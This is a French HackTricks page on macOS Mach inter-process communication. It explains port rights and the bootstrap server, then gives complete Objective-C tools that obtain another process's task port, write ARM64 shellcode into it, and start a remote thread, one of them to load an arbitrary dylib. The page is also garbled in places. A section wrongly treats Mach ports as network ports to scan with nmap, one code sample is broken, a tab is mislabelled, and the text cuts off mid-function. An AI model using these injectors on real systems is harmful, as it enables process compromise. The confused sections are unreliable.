# macOS IPC - Communication inter-processus

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Messagerie Mach via les ports

Mach utilise des **tâches** comme **plus petite unité** pour partager des ressources, et chaque tâche peut contenir **plusieurs threads**. Ces **tâches et threads sont mappés 1:1 sur les processus et threads POSIX**.

La communication entre les tâches se fait via la Communication Inter-Processus (IPC) de Mach, en utilisant des canaux de communication unidirectionnels. Les **messages sont transférés entre les ports**, qui agissent comme des **files d'attente de messages** gérées par le noyau.

Chaque processus a une **table IPC**, où il est possible de trouver les **ports Mach du processus**. Le nom d'un port Mach est en réalité un nombre (un pointeur vers l'objet du noyau).

Un processus peut également envoyer un nom de port avec certains droits **à une autre tâche** et le noyau fera apparaître cette entrée dans la **table IPC de l'autre tâche**.

Les droits de port, qui définissent les opérations qu'une tâche peut effectuer, sont essentiels pour cette communication. Les **droits de port** possibles sont :

* Le **droit de réception**, qui permet de recevoir les messages envoyés au port. Les ports Mach sont des files d'attente MPSC (multiple-producteur, single-consommateur), ce qui signifie qu'il ne peut y avoir qu'un **seul droit de réception pour chaque port** dans tout le système (contrairement aux pipes, où plusieurs processus peuvent tous détenir des descripteurs de fichier pour l'extrémité de lecture d'un pipe).
* Une **tâche avec le droit de réception** peut recevoir des messages et **créer des droits d'envoi**, ce qui lui permet d'envoyer des messages. À l'origine, seule la **tâche elle-même a le droit de réception sur son port**.
* Le **droit d'envoi**, qui permet d'envoyer des messages au port.
* Le droit d'envoi peut être **cloné** afin qu'une tâche possédant un droit d'envoi puisse cloner le droit et **l'accorder à une troisième tâche**.
* Le **droit d'envoi unique**, qui permet d'envoyer un seul message au port, puis disparaît.
* Le **droit d'ensemble de ports**, qui indique un _ensemble de ports_ plutôt qu'un seul port. Le défilement d'un message à partir d'un ensemble de ports défile un message à partir de l'un des ports qu'il contient. Les ensembles de ports peuvent être utilisés pour écouter plusieurs ports simultanément, un peu comme `select`/`poll`/`epoll`/`kqueue` dans Unix.
* Le **nom mort**, qui n'est pas un droit de port réel, mais simplement un espace réservé. Lorsqu'un port est détruit, tous les droits de port existants sur le port deviennent des noms morts.

**Les tâches peuvent transférer des droits d'ENVOI à d'autres**, leur permettant d'envoyer des messages en retour. **Les droits d'ENVOI peuvent également être clonés, de sorte qu'une tâche peut dupliquer et donner le droit à une troisième tâche**. Cela, combiné à un processus intermédiaire appelé **serveur d'amorçage**, permet une communication efficace entre les tâches.

#### Étapes :

Comme mentionné précédemment, pour établir le canal de communication, le **serveur d'amorçage** (**launchd** sur Mac) est impliqué.

1. La tâche **A** initialise un **nouveau port**, obtenant un **droit de réception** dans le processus.
2. La tâche **A**, étant le détenteur du droit de réception, **génère un droit d'envoi pour le port**.
3. La tâche **A** établit une **connexion** avec le **serveur d'amorçage**, fournissant le **nom de service du port** et le **droit d'envoi** via une procédure appelée enregistrement d'amorçage.
4. La tâche **B** interagit avec le **serveur d'amorçage** pour exécuter une **recherche d'amorçage pour le service**. Si cela réussit, le **serveur duplique le droit d'envoi** reçu de la tâche A et **le transmet à la tâche B**.
5. Une fois qu'il a acquis un droit d'envoi, la tâche **B** est capable de **formuler** un **message** et de l'envoyer **à la tâche A**.

Le serveur d'amorçage ne peut pas authentifier le nom de service revendiqué par une tâche. Cela signifie qu'une **tâche** pourrait potentiellement **usurper l'identité de n'importe quelle tâche système**, en revendiquant faussement un nom de service d'autorisation, puis en approuvant chaque demande.

Ensuite, Apple stocke les **noms des services fournis par le système** dans des fichiers de configuration sécurisés, situés dans des répertoires protégés par SIP : `/System/Library/LaunchDaemons` et `/System/Library/LaunchAgents`. À côté de chaque nom de service, le **binaire associé est également stocké**. Le serveur d'amorçage créera et conservera un **droit de réception pour chacun de ces noms de service**.

Pour ces services prédéfinis, le **processus de recherche diffère légèrement**. Lorsqu'un nom de service est recherché, launchd lance le service dynamiquement. Le nouveau flux de travail est le suivant :

* La tâche **B** initialise une **recherche d'amorçage** pour un nom de service.
* **launchd** vérifie si la tâche est en cours d'exécution et si ce n'est pas le cas, la **démarre**.
* La tâche **A** (le service) effectue un **enregistrement d'amorçage**. Ici, le **serveur d'amorçage** crée un droit d'envoi, le conserve et **transfère le droit de réception à la tâche A**.
* launchd duplique le **droit d'envoi et l'envoie à la tâche B**.

Cependant, ce processus ne s'applique qu'aux tâches système prédéfinies. Les tâches non système fonctionnent toujours comme décrit initialement, ce qui pourrait potentiellement permettre l'usurpation d'identité.
### Énumérer les ports

Pour identifier les services en cours d'exécution sur une machine, il est essentiel de connaître les ports ouverts. Les ports sont des canaux de communication utilisés par les applications pour échanger des données avec d'autres machines. L'identification des ports ouverts peut aider à détecter les services vulnérables ou non autorisés.

Il existe plusieurs méthodes pour énumérer les ports ouverts sur une machine. Voici quelques-unes des techniques couramment utilisées :

1. Balayage TCP : Cette technique consiste à envoyer des paquets TCP à différents ports pour déterminer s'ils sont ouverts, fermés ou filtrés. Des outils tels que Nmap peuvent être utilisés pour effectuer un balayage TCP.

2. Balayage UDP : Contrairement au balayage TCP, le balayage UDP est utilisé pour identifier les ports UDP ouverts. Les paquets UDP sont envoyés aux ports cibles, et si une réponse est reçue, cela indique que le port est ouvert.

3. Balayage furtif : Cette technique, également connue sous le nom de balayage furtif ou balayage Xmas, consiste à envoyer des paquets TCP avec des drapeaux inhabituels pour déterminer si un port est ouvert. Si aucune réponse n'est reçue, cela peut indiquer que le port est filtré ou fermé.

4. Balayage des services : Cette méthode consiste à interroger les services spécifiques pour déterminer les ports ouverts. Par exemple, en utilisant des outils tels que Nmap, il est possible de balayer les ports associés aux services HTTP, FTP, SSH, etc.

Il est important de noter que l'énumération des ports sans autorisation appropriée peut être illégale et constitue une violation de la vie privée. Il est donc essentiel de respecter les lois et les réglementations en vigueur lors de l'utilisation de ces techniques.
```bash
lsmp -p <pid>
```
Vous pouvez installer cet outil sur iOS en le téléchargeant depuis [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Exemple de code

Notez comment l'**expéditeur** **alloue** un port, crée un **droit d'envoi** pour le nom `org.darlinghq.example` et l'envoie au **serveur d'amorçage** tandis que l'expéditeur demande le **droit d'envoi** de ce nom et l'utilise pour **envoyer un message**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>

#define BUFFER_SIZE 100

int main(int argc, char** argv) {
    mach_port_t server_port;
    kern_return_t kr;
    char buffer[BUFFER_SIZE];

    // Create a send right to the server port
    kr = bootstrap_look_up(bootstrap_port, "com.example.server", &server_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to look up server port: %s\n", mach_error_string(kr));
        return 1;
    }

    // Send a message to the server
    strcpy(buffer, "Hello, server!");
    kr = mach_msg_send((mach_msg_header_t*)buffer);
    if (kr != KERN_SUCCESS) {
        printf("Failed to send message: %s\n", mach_error_string(kr));
        return 1;
    }

    return 0;
}
```
{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Ports privilégiés

* **Port hôte**: Si un processus a le **privilège d'envoi** sur ce port, il peut obtenir des **informations** sur le **système** (par exemple, `host_processor_info`).
* **Port privilégié de l'hôte**: Un processus avec le droit d'**envoi** sur ce port peut effectuer des **actions privilégiées** telles que le chargement d'une extension du noyau. Le **processus doit être root** pour obtenir cette permission.
* De plus, pour appeler l'API **`kext_request`**, il est nécessaire de disposer d'autres autorisations **`com.apple.private.kext*`** qui ne sont accordées qu'aux binaires Apple.
* **Port du nom de la tâche**: Une version non privilégiée du _port de la tâche_. Il fait référence à la tâche, mais ne permet pas de la contrôler. La seule chose qui semble être disponible à travers lui est `task_info()`.
* **Port de la tâche** (alias port du noyau)**:** Avec l'autorisation d'envoi sur ce port, il est possible de contrôler la tâche (lecture/écriture de mémoire, création de threads...).
* Appelez `mach_task_self()` pour **obtenir le nom** de ce port pour la tâche appelante. Ce port n'est **hérité** qu'à travers **`exec()`**; une nouvelle tâche créée avec `fork()` obtient un nouveau port de tâche (dans un cas particulier, une tâche obtient également un nouveau port de tâche après `exec()` dans un binaire suid). La seule façon de créer une tâche et d'obtenir son port est d'effectuer la ["danse de l'échange de port"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) tout en effectuant un `fork()`.
* Voici les restrictions d'accès au port (à partir de `macos_task_policy` du binaire `AppleMobileFileIntegrity`):
* Si l'application a l'autorisation **`com.apple.security.get-task-allow`**, les processus de **même utilisateur peuvent accéder au port de la tâche** (communément ajoutée par Xcode pour le débogage). Le processus de **notarisation** ne le permettra pas pour les versions de production.
* Les applications ayant l'autorisation **`com.apple.system-task-ports`** peuvent obtenir le **port de la tâche pour n'importe quel** processus, sauf le noyau. Dans les anciennes versions, cela s'appelait **`task_for_pid-allow`**. Cela n'est accordé qu'aux applications Apple.
* **Root peut accéder aux ports de tâche** des applications **non** compilées avec un **runtime renforcé** (et non provenant d'Apple).

### Injection de shellcode dans un thread via le port de la tâche&#x20;

Vous pouvez obtenir un shellcode à partir de :

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compilez** le programme précédent et ajoutez les **droits** nécessaires pour pouvoir injecter du code avec le même utilisateur (sinon vous devrez utiliser **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Injection de dylib dans un thread via le port de tâche

Dans macOS, les **threads** peuvent être manipulés via **Mach** ou en utilisant l'API **posix `pthread`**. Le thread que nous avons généré lors de l'injection précédente a été généré en utilisant l'API Mach, donc **il n'est pas conforme à posix**.

Il était possible d'**injecter un simple shellcode** pour exécuter une commande car cela ne nécessitait pas de travailler avec des API conformes à posix, seulement avec Mach. Des **injections plus complexes** nécessiteraient que le **thread** soit également conforme à posix.

Par conséquent, pour **améliorer le thread**, il devrait appeler **`pthread_create_from_mach_thread`** qui va **créer un pthread valide**. Ensuite, ce nouveau pthread pourrait **appeler dlopen** pour **charger une dylib** du système, donc au lieu d'écrire un nouveau shellcode pour effectuer différentes actions, il est possible de charger des bibliothèques personnalisées.

Vous pouvez trouver des **exemples de dylibs** dans (par exemple celui qui génère un journal que vous pouvez ensuite écouter) :

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}
```c
if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
    memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);
    printf("Pthread create depuis le thread mach @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
    printf("DLOpen @%llx\n", addrOfDlopen);
    memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
    strcpy(possiblePatchLocation, lib);
}
}

// Écrire le shellcode dans la mémoire allouée
kr = mach_vm_write(remoteTask,                   // Port de la tâche
                   remoteCode64,                 // Adresse virtuelle (Destination)
                   (vm_address_t) injectedCode,  // Source
                   0xa9);                       // Longueur de la source

if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "Impossible d'écrire dans la mémoire du thread distant : Erreur %s\n", mach_error_string(kr));
    return (-3);
}

// Définir les autorisations sur la mémoire allouée pour le code
kr = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "Impossible de définir les autorisations de mémoire pour le code du thread distant : Erreur %s\n", mach_error_string(kr));
    return (-4);
}

// Définir les autorisations sur la mémoire allouée pour la pile
kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "Impossible de définir les autorisations de mémoire pour la pile du thread distant : Erreur %s\n", mach_error_string(kr));
    return (-4);
}

// Créer un thread pour exécuter le shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));

remoteStack64 += (STACK_SIZE / 2); // c'est la vraie pile
//remoteStack64 -= 8;  // besoin d'un alignement de 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf("Pile distante 64  0x%llx, le code distant est %p\n", remoteStack64, p);

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
                           (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);

if (kr != KERN_SUCCESS) {
    fprintf(stderr, "Impossible de créer un thread distant : erreur %s", mach_error_string(kr));
    return (-3);
}

return (0);
}

int main(int argc, const char * argv[])
{
if (argc < 3)
{
